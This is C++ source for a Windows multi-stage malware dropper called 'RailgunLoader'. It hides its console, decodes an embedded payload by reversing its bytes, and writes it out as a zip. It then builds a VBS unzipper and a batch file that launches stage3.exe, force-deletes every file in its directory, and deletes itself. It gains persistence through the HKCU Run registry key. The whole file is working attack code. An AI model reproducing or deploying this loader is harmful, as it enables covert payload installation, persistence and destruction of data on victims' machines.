#define WINDOWS_LEAN_AND_MEAN

#include <iostream>
#include <windows.h>
#include <string>

#include "Example_Image.h"

#pragma warning( push )
#pragma warning( disable : 4267 )   //disable DWORD conversion warnings

BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args);

void main(void) {
    //-------------------------------------------------------start-up

    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$RailgunLoader$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit(0);
    }

    //-------------------------------------------------------write 2stage raw .zip

    int dataSz  = sizeof(rawData);                          //size of PE Image buffer
    char* CryptedHex = new char[dataSz];                    //allocate decryption buffer on heap or we might run out of space

    for (int i = 0; i < dataSz; i++) {   
        CryptedHex[i] = rawData[dataSz - i - 1];            //reverse the array
    }
    std::string TempFile= "temp";
    TempFile += std::to_string(GetTickCount());             //create a temp file to write to
    TempFile += ".txt";

    DWORD WrittenBytes;

    std::string MyVBFile;

    HANDLE MyFile = CreateFileA(TempFile.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE,NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);

    WriteFile(MyFile,CryptedHex,dataSz,&WrittenBytes,NULL); //write the raw hex
    MoveFileA(TempFile.c_str(),"stage2.zip");               //rename the file

    delete[] CryptedHex;
    CloseHandle(MyFile);

    //------------------------------------------------------make stage2 .VBS Unzipper

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));                    //get path to executable
    std::string::size_type pos = std::string(PathToFile).find_last_of("\\/");       //cut the exe's name
    std::string CurrentDir = std::string(PathToFile).substr(0, pos);
    std::string SecondStageZip = CurrentDir;
    SecondStageZip += "\\stage2.zip";
    
    HANDLE VBSFile = CreateFileA("stage2.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(VBSFile, "ZipFile=\"", strlen("ZipFile=\""), &WrittenBytes, NULL);
    WriteFile(VBSFile, SecondStageZip.c_str(), strlen(SecondStageZip.c_str()), &WrittenBytes, NULL);
    WriteFile(VBSFile, "\"\n", strlen("\"\n"), &WrittenBytes, NULL);
    WriteFile(VBSFile, "ExtractTo=\"", strlen("ExtractTo=\""), &WrittenBytes, NULL);
    WriteFile(VBSFile, CurrentDir.c_str(), strlen(CurrentDir.c_str()), &WrittenBytes, NULL);
    WriteFile(VBSFile, "\"\n", strlen("\"\n"), &WrittenBytes, NULL);
    WriteFile(VBSFile, "Set fso = CreateObject(\"Scripting.FileSystemObject\")\n", strlen("Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"), &WrittenBytes, NULL);    //1
    WriteFile(VBSFile, "If NOT fso.FolderExists(ExtractTo) Then\n", strlen("If NOT fso.FolderExists(ExtractTo) Then\n"), &WrittenBytes, NULL);                                  //2
    WriteFile(VBSFile, "   fso.CreateFolder(ExtractTo)\n", strlen("   fso.CreateFolder(ExtractTo)\n"), &WrittenBytes, NULL);                                                    //3
    WriteFile(VBSFile, "End If\n", strlen("End If\n"), &WrittenBytes, NULL);                                                                                                    //4
    WriteFile(VBSFile, "set objShell = CreateObject(\"Shell.Application\")\n", strlen("set objShell = CreateObject(\"Shell.Application\")\n"), &WrittenBytes, NULL);            //5
    WriteFile(VBSFile, "set FilesInZip=objShell.NameSpace(ZipFile).items\n", strlen("set FilesInZip=objShell.NameSpace(ZipFile).items\n"), &WrittenBytes, NULL);                //6
    WriteFile(VBSFile, "objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)\n", strlen("objShell.NameSpace(ExtractTo).CopyHere(FilesInZip)\n"), &WrittenBytes, NULL);            //7
    WriteFile(VBSFile, "Set fso = Nothing\n", strlen("Set fso = Nothing\n"), &WrittenBytes, NULL);                                                                              //8
    WriteFile(VBSFile, "Set objShell = Nothing\n", strlen("Set objShell = Nothing\n"), &WrittenBytes, NULL);                                                                    //9

    MoveFileA("stage2.txt", "stage2.vbs");               //rename the file

    //------------------------------------------------------make stage2 .bat autorun and cleanup

    std::string PathToBat = CurrentDir;
    PathToBat += "\\stage2.bat";

    HANDLE BATFile = CreateFileA("bat2.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(BATFile, "@echo off & ", strlen("@echo off & "), &WrittenBytes, NULL);    //1
    WriteFile(BATFile, "start stage2.vbs & ", strlen("start stage2.vbs & "), &WrittenBytes, NULL);                                      //2
    WriteFile(BATFile, "start stage3.exe & ", strlen("start stage3.exe & "), &WrittenBytes, NULL);                                      //3
    WriteFile(BATFile, "timeout /t 2 & ", strlen("timeout /t 2 & "), &WrittenBytes, NULL);                                    //4
    WriteFile(BATFile, "del /f /s /q *.* & ", strlen("del /f /s /q *.* & "), &WrittenBytes, NULL);                                      //5
    WriteFile(BATFile, "(goto) 2>nul & del \" % ~f0\"", strlen("(goto) 2>nul & del \" % ~f0\""), &WrittenBytes, NULL);            //6

    MoveFileA("bat2.txt", PathToBat.c_str());               //rename the file


    RegisterMyProgramForStartup("Stage2Loader",PathToBat.c_str(),"");

}

BOOL RegisterMyProgramForStartup(PCSTR pszAppName, PCSTR pathToExe, PCSTR args)
{
    HKEY hKey = NULL;
    LONG lResult = 0;
    BOOL fSuccess = TRUE;
    DWORD dwSize;

    const size_t count = MAX_PATH * 2;
    char szValue[count] = {};


    strcpy_s(szValue, "\"");
    strcat_s(szValue, pathToExe);
    strcat_s(szValue, "\" ");

    if (args != NULL)
    {
        strcat_s(szValue, args);
    }

    lResult = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

    fSuccess = (lResult == 0);

    if (fSuccess)
    {
        dwSize = (DWORD)(strlen(szValue) + 1) * 2;
        lResult = RegSetValueExA(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
        fSuccess = (lResult == 0);
    }

    if (hKey != NULL)
    {
        RegCloseKey(hKey);
        hKey = NULL;
    }

    return fSuccess;
}

#pragma warning ( pop )